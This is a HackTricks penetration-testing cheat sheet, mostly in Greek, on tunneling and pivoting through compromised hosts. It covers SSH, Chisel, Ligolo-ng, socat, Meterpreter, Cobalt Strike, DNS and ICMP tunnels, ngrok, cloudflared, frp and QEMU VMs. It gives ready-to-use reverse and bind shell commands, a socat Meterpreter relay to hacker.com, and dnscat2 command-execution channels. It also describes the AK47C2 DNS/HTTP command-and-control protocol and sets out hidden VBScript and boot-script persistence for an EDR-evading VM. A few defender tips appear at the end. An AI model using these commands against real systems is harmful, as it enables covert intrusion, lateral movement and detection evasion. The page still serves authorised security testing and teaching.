# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Συμβουλή Nmap

> [!WARNING]
> Οι **ICMP** και **SYN** scans δεν μπορούν να tunnelled μέσω socks proxies, οπότε πρέπει να **disable ping discovery** (`-Pn`) και να καθορίσουμε **TCP scans** (`-sT`) για να λειτουργήσει αυτό.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Γραφική σύνδεση SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Άνοιγμα νέας Port στο SSH Server --> Άλλη Port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Τοπική θύρα --> Compromised host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Τοπικό Port --> Παραβιασμένος host (SSH) --> Οπουδήποτε
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Αυτό είναι χρήσιμο για να αποκτήσετε reverse shells από internal hosts μέσω DMZ στον host σας:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Χρειάζεστε **root και στις δύο συσκευές** (καθώς πρόκειται να δημιουργήσετε νέες διεπαφές) και το sshd config πρέπει να επιτρέπει το root login:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Ενεργοποιήστε το forwarding στην πλευρά του Server
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Ρυθμίστε μια νέα route στην πλευρά του client
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Ασφάλεια – Terrapin Attack (CVE-2023-48795)**
> Η επίθεση υποβάθμισης Terrapin του 2023 μπορεί να επιτρέψει σε έναν man-in-the-middle να παραποιήσει το πρώιμο SSH handshake και να εγχύσει δεδομένα σε **any forwarded channel** ( `-L`, `-R`, `-D` ). Βεβαιωθείτε ότι τόσο ο client όσο και ο server είναι patched (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ή απενεργοποιήστε ρητά τους ευάλωτους αλγορίθμους `chacha20-poly1305@openssh.com` και `*-etm@openssh.com` στο `sshd_config`/`ssh_config` πριν βασιστείτε σε SSH tunnels.

## SSHUTTLE

Μπορείτε να **tunnel** μέσω **ssh** όλη την **traffic** προς ένα **subnetwork** μέσω ενός host.\
Για παράδειγμα, προωθώντας όλη την traffic που πηγαίνει προς 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Σύνδεση με ιδιωτικό κλειδί
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Τοπική θύρα --> Συμβιβασμένος host (ενεργή συνεδρία) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Ένας άλλος τρόπος:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Άνοιξε μια θύρα στον teamserver που ακούει σε όλες τις διεπαφές και μπορεί να χρησιμοποιηθεί για να **δρομολογήσει την κυκλοφορία μέσω του beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Σε αυτή την περίπτωση, το **port is opened in the beacon host**, όχι στον Team Server και η κυκλοφορία αποστέλλεται στο Team Server και από εκεί στον υποδεικνυόμενο host:port
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
To note:

- Beacon's reverse port forward έχει σχεδιαστεί για να **tunnel traffic προς το Team Server, όχι για relaying μεταξύ μεμονωμένων μηχανών**.
- Η traffic είναι **tunneled μέσα στο Beacon's C2 traffic**, συμπεριλαμβανομένων P2P links.
- **Admin privileges are not required** για να δημιουργηθούν reverse port forwards σε high ports.

### rPort2Port local

> [!WARNING]
> Σε αυτή την περίπτωση, η **port ανοίγεται στον beacon host**, όχι στο Team Server και η **traffic αποστέλλεται στον Cobalt Strike client** (όχι στο Team Server) και από εκεί στον υποδεικνυόμενο host:port
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Πρέπει να ανεβάσετε ένα web file tunnel: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Μπορείτε να το κατεβάσετε από τη σελίδα releases του [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Πρέπει να χρησιμοποιήσετε την **ίδια έκδοση για τον client και τον server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Χρησιμοποιήστε την ίδια έκδοση για τον agent και τον proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Δέσμευση και ακρόαση Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Πρόσβαση στις τοπικές θύρες του Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. Η σήραγγα ξεκινά από το θύμα.\
Δημιουργείται ένα socks4 proxy στο 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot μέσω **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port μέσω socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter μέσω SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Μπορείτε να παρακάμψετε έναν **non-authenticated proxy** εκτελώντας αυτή τη γραμμή αντί για την τελευταία στην κονσόλα του θύματος:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Δημιουργήστε πιστοποιητικά και στις δύο πλευρές: Client και Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Συνδέστε την τοπική θύρα SSH (22) στη θύρα 443 του attacker host
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Είναι σαν μια κονσολική έκδοση του PuTTY (οι επιλογές είναι πολύ παρόμοιες με αυτές ενός ssh client).

Εφόσον αυτό το binary θα εκτελεστεί στο θύμα και είναι ssh client, πρέπει να ανοίξουμε την ssh υπηρεσία και τη θύρα μας ώστε να έχουμε μια reverse connection. Στη συνέχεια, για να προωθήσουμε μόνο μια τοπικά προσβάσιμη θύρα σε μια θύρα στο μηχάνημά μας:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Πρέπει να είστε local admin (for any port)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

You need to have **RDP access over the system**.\
Λήψη:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Αυτό το εργαλείο χρησιμοποιεί `Dynamic Virtual Channels` (`DVC`) από το χαρακτηριστικό Remote Desktop Service των Windows. Το DVC είναι υπεύθυνο για **tunneling packets over the RDP connection**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Στον client υπολογιστή σας φορτώστε **`SocksOverRDP-Plugin.dll`** ως εξής:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Τώρα μπορούμε να **συνδεθούμε** με το **θύμα** μέσω **RDP** χρησιμοποιώντας το **`mstsc.exe`**, και θα πρέπει να λάβουμε ένα **μήνυμα** που λέει ότι το **SocksOverRDP plugin is enabled**, το οποίο θα **ακούει** στη διεύθυνση **127.0.0.1:1080**.

**Συνδεθείτε** μέσω **RDP** και ανεβάστε & εκτελέστε στη μηχανή του θύματος το εκτελέσιμο `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Τώρα, επιβεβαιώστε στον υπολογιστή σας (attacker) ότι η θύρα 1080 ακούει:
```
netstat -antb | findstr 1080
```
Τώρα μπορείτε να χρησιμοποιήσετε [**Proxifier**](https://www.proxifier.com/) **για να κάνετε proxy την κίνηση μέσω αυτής της θύρας.**

## Proxify Windows GUI Apps

Μπορείτε να κάνετε τα Windows GUI apps να περάσουν μέσω ενός proxy χρησιμοποιώντας [**Proxifier**](https://www.proxifier.com/).\
In **Profile -> Proxy Servers** add the IP and port of the SOCKS server.\
In **Profile -> Proxification Rules** add the name of the program to proxify and the connections to the IPs you want to proxify.

## NTLM proxy bypass

Το προηγουμένως αναφερθέν εργαλείο: **Rpivot**\
Το **OpenVPN** μπορεί επίσης να το παρακάμψει, ρυθμίζοντας αυτές τις επιλογές στο αρχείο διαμόρφωσης:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Επικυρώνεται απέναντι σε έναν proxy και δεσμεύει τοπικά ένα port που προωθείται στην εξωτερική υπηρεσία που καθορίζετε. Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το εργαλείο της επιλογής σας μέσω αυτού του port.\
Για παράδειγμα, αυτό προωθεί το port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Τώρα, αν ρυθμίσετε για παράδειγμα στον victim την υπηρεσία **SSH** να ακούει στην port 443. Μπορείτε να συνδεθείτε σε αυτήν μέσω της attacker port 2222.\
Μπορείτε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443 και ο attacker ακούει στην port 2222.

## YARP

Ένας reverse proxy που δημιουργήθηκε από τη Microsoft. Μπορείτε να τον βρείτε εδώ: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Απαιτείται Root και στα δύο συστήματα για να δημιουργηθούν tun adapters και να γίνει tunneling των δεδομένων μεταξύ τους χρησιμοποιώντας DNS queries.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Το tunnel θα είναι πολύ αργό. Μπορείτε να δημιουργήσετε μια συμπιεσμένη σύνδεση SSH μέσω αυτού του tunnel χρησιμοποιώντας:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

Εγκαθιδρύει κανάλι C\&C μέσω DNS. Δεν χρειάζεται δικαιώματα root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **Σε PowerShell**

Μπορείτε να χρησιμοποιήσετε [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) για να τρέξετε έναν dnscat2 client σε PowerShell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding με dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Αλλαγή proxychains DNS

Το proxychains παρεμβάλλει την κλήση libc `gethostbyname` και δρομολογεί tcp DNS αιτήσεις μέσω του socks proxy. Από **προεπιλογή** ο **DNS** server που χρησιμοποιεί το proxychains είναι **4.2.2.2** (hardcoded). Για να το αλλάξετε, επεξεργαστείτε το αρχείο: _/usr/lib/proxychains3/proxyresolv_ και αλλάξτε το IP. Αν βρίσκεστε σε **Windows environment** μπορείτε να ορίσετε το IP του **domain controller**.

## Σήραγγες σε Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Ο actor Storm-2603 δημιούργησε ένα **dual-channel C2 ("AK47C2")** που καταχράται *μόνο* εξερχόμενη κίνηση **DNS** και **plain HTTP POST** – δύο πρωτόκολλα που σπάνια μπλοκάρονται σε εταιρικά δίκτυα.

1. **DNS mode (AK47DNS)**
• Δημιουργεί ένα τυχαίο 5-χαρακτήρων SessionID (π.χ. `H4T14`).
• Προθέτει `1` για *task requests* ή `2` για *results* και συγκολλά διαφορετικά πεδία (flags, SessionID, computer name).
• Κάθε πεδίο είναι **XOR-encrypted with the ASCII key `VHBD@H`**, hex-encoded, και κολλημένα με τελείες – τελειώνοντας με το domain που ελέγχεται από τον attacker:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Τα requests χρησιμοποιούν `DnsQuery()` για **TXT** (και fallback **MG**) records.
• Όταν η απάντηση ξεπεράσει τα 0xFF bytes, το backdoor **fragments** τα δεδομένα σε κομμάτια των 63 bytes και εισάγει τους δείκτες:
`s<SessionID>t<TOTAL>p<POS>` ώστε ο C2 server να μπορεί να τα επαναταξινομήσει.

2. **HTTP mode (AK47HTTP)**
• Κατασκευάζει έναν JSON φάκελο:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Το σύνολο του blob είναι XOR-`VHBD@H` → hex → στέλνεται ως το σώμα ενός **`POST /`** με header `Content-Type: text/plain`.
• Η απάντηση ακολουθεί την ίδια κωδικοποίηση και το πεδίο `cmd` εκτελείται με `cmd.exe /c <command> 2>&1`.

Blue Team notes
• Ψάξτε για ασυνήθιστες **TXT queries** των οποίων η πρώτη ετικέτα είναι μακρύ hexadecimal και καταλήγει πάντα σε ένα σπάνιο domain.
• Ένα σταθερό XOR key ακολουθούμενο από ASCII-hex είναι εύκολο να ανιχνευθεί με YARA: `6?56484244?484` (`VHBD@H` in hex).
• Για HTTP, σημαδέψτε text/plain POST bodies που είναι καθαρό hex και μήκος πολλαπλάσιο των δύο bytes.

{{#note}}
Ολόκληρο το κανάλι χωράει εντός **standard RFC-compliant queries** και διατηρεί κάθε sub-domain label κάτω από 63 bytes, κάνοντάς το stealthy στα περισσότερα DNS logs.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Απαιτούνται δικαιώματα root και στα δύο συστήματα για να δημιουργηθούν tun adapters και να δρομολογηθούν δεδομένα ανάμεσά τους χρησιμοποιώντας ICMP echo requests.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Κατεβάστε το από εδώ**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **είναι ένα εργαλείο για να εκθέσετε λύσεις στο Διαδίκτυο με μία εντολή.**\
_Τα URI έκθεσης μοιάζουν με:_ **UID.ngrok.io**

### Εγκατάσταση

- Δημιουργήστε έναν λογαριασμό: https://ngrok.com/signup
- Λήψη client:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Βασικές χρήσεις

**Τεκμηρίωση:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Είναι επίσης δυνατή η προσθήκη authentication και TLS, αν είναι απαραίτητο._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Έκθεση αρχείων μέσω HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing κλήσεων HTTP

_Χρήσιμο για XSS,SSRF,SSTI ..._\
Απευθείας από stdout ή στη διεπαφή HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling εσωτερικής υπηρεσίας HTTP
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml απλό παράδειγμα διαμόρφωσης

Ανοίγει 3 τούνελ:

- 2 TCP
- 1 HTTP που εξυπηρετεί στατικά αρχεία από /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Το daemon `cloudflared` της Cloudflare μπορεί να δημιουργήσει εξερχόμενα tunnels που εκθέτουν **τοπικές υπηρεσίες TCP/UDP** χωρίς να απαιτούνται κανόνες εισερχόμενου firewall, χρησιμοποιώντας το edge της Cloudflare ως σημείο συνάντησης. Αυτό είναι πολύ χρήσιμο όταν το firewall εξερχόμενης κίνησης επιτρέπει μόνο HTTPS κυκλοφορία αλλά οι εισερχόμενες συνδέσεις είναι μπλοκαρισμένες.

### Γρήγορη one-liner εντολή για tunnel
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Επίμονες σήραγγες μέσω DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Ξεκινήστε τον connector:
```bash
cloudflared tunnel run mytunnel
```
Because all traffic leaves the host **outbound over 443**, Cloudflared tunnels are a simple way to bypass ingress ACLs or NAT boundaries. Be aware that the binary usually runs with elevated privileges – use containers or the `--user` flag when possible.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) είναι ένα ενεργά συντηρούμενο Go reverse-proxy που υποστηρίζει **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**. Από την **v0.53.0 (May 2024)** μπορεί να λειτουργήσει ως **SSH Tunnel Gateway**, έτσι ένας target host μπορεί να spin up ένα reverse tunnel χρησιμοποιώντας μόνο τον stock OpenSSH client – no extra binary required.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Χρήση της νέας SSH gateway (χωρίς frpc binary)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Η παραπάνω εντολή δημοσιεύει τη θύρα του θύματος **8080** ως **attacker_ip:9000** χωρίς να αναπτύσσει επιπλέον εργαλεία – ιδανικό για living-off-the-land pivoting.

## Κρυφοί τούνελ βασισμένα σε VM με QEMU

Το user-mode networking του QEMU (`-netdev user`) υποστηρίζει μια επιλογή που ονομάζεται `hostfwd` που **binds a TCP/UDP port on the *host* and forwards it into the *guest***. Όταν ο *guest* τρέχει πλήρες SSH daemon, ο κανόνας hostfwd σας παρέχει ένα disposable SSH jump box που ζει εξ ολοκλήρου μέσα σε ένα ephemeral VM – ιδανικό για την απόκρυψη του C2 traffic από EDR επειδή όλη η κακόβουλη δραστηριότητα και τα αρχεία παραμένουν στο virtual disk.

### Γρήγορος one-liner
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Η εντολή παραπάνω εκκινεί μια εικόνα **Tiny Core Linux** (`tc.qcow2`) στη RAM.  
• Η θύρα **2222/tcp** στον Windows host προωθείται διαφανώς στην **22/tcp** εντός του guest.  
• Από την οπτική του attacker, ο στόχος απλώς εκθέτει τη θύρα 2222· οποιαδήποτε πακέτα που φτάνουν σε αυτήν χειρίζεται ο SSH server που τρέχει στη VM.

### Εκκίνηση αθόρυβα μέσω VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Εκτέλεση του script με `cscript.exe //B update.vbs` διατηρεί το παράθυρο κρυφό.

### In-guest persistence

Επειδή το Tiny Core είναι stateless, οι επιτιθέμενοι συνήθως:

1. Drop payload to `/opt/123.out`
2. Προσθέτουν στο `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Προσθέτουν `home/tc` και `opt` στο `/opt/filetool.lst` ώστε το payload να πακετάρεται στο `mydata.tgz` κατά το shutdown.

### Why this evades detection

• Μόνο δύο unsigned executables (`qemu-system-*.exe`) αγγίζουν το δίσκο· δεν εγκαθίστανται drivers ή services.  
• Τα security προϊόντα στο host βλέπουν **benign loopback traffic** (ο πραγματικός C2 τερματίζεται μέσα στο VM).  
• Οι memory scanners δεν αναλύουν ποτέ τον malicious process space γιατί αυτός ζει σε διαφορετικό OS.

### Defender tips

• Alert on **unexpected QEMU/VirtualBox/KVM binaries** in user-writable paths.  
• Block outbound connections that originate from `qemu-system*.exe`.  
• Hunt for rare listening ports (2222, 10022, …) που bind-άρονται αμέσως μετά από launch ενός QEMU.

